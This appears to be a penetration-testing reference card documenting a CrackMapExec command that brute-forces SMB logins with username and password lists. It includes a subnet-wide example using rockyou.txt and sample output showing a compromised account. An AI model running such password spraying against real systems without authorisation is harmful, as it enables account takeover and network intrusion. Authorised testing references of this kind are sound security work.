---
type: command
executor: bash
data: crackmapexec smb $_TARGET_IP -u $_USERNAME_LIST -p $_PASSWORD_LIST
output: >-
  CME          10.10.10.10:445 TARGET [*] Windows 10.0 Build 17763 (name:TARGET)
  (domain:DOMAIN)

  CME          10.10.10.10:445 TARGET [+] DOMAIN\user:password (Pwn3d!)

  [*] KTHXBYE!
platforms:
  - Linux
  - Windows
tags:
  - brute-force
  - smb
verified: true
validated: true
---

# crackingmapexec-brute-force-smb-usernames-and-passwords

## Command

```bash
crackmapexec smb $_TARGET_IP -u $_USERNAME_LIST -p $_PASSWORD_LIST
```

## Description

Performs SMB authentication attempts using lists of usernames and passwords to identify valid credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP or range | Yes |
| $_USERNAME_LIST | File with usernames (one per line) | Yes |
| $_PASSWORD_LIST | File with passwords (one per line) | Yes |
| smb | Protocol specifier | Yes (v5+) |

## Examples

### Basic Usage

```bash
crackmapexec smb 10.10.10.10 -u users.txt -p rockyou.txt
```

### Advanced Usage

```bash
crackmapexec smb 10.10.10.0/24 -u users.txt -p common.txt --continue-on-success
```

## Expected Output

Description of successful auth with 'Pwn3d!' indicator and failed attempts.

## Related

- [[procedures/brute-force-smb-usernames-and-passwords]]
- [[tools/CrackMapExec]]
